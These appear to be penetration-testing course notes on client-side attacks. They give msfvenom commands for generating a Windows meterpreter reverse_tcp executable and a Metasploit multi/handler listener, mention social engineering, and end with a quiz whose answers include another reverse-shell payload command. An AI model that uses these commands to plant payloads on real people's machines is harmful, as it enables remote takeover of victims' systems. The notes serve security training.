- Allows an end user to execute the payload
- Utilize social engineering techniques
- Take advantage of human vulnerabilities 

#### MSFvenom

- Used to generate payloads
- msfencode - used to encode payloads
- Payload will execute and make a connection back to a C2 Server


Run Msfvenom
```
msfvenom
```

list msfvenom payloads
```
msfvenom --list payloads
```

Generate msfvenom payload
```
msfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=<local_ip_address> LPORT=<local_port> -f exe > <storage_directory_of_payload>/<payload_name_&_extension>
```

List formats for payloads
```
msfvenom --list formats
```

Setup listener for payload
```
use exploit/multi/handler
payload <payload_chosen>
set LHOST <local_ip_address>
set LPORT <local_port>
exploit
```
## Quiz

Msfvenom can be used to encode payloads

	True

Which one of the following Msfvenom commands can be used to generate an x64 Windows meterpreter payload?

	msfvenom -a x64 -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.1 LPORT=1234 -f exe > payload.exe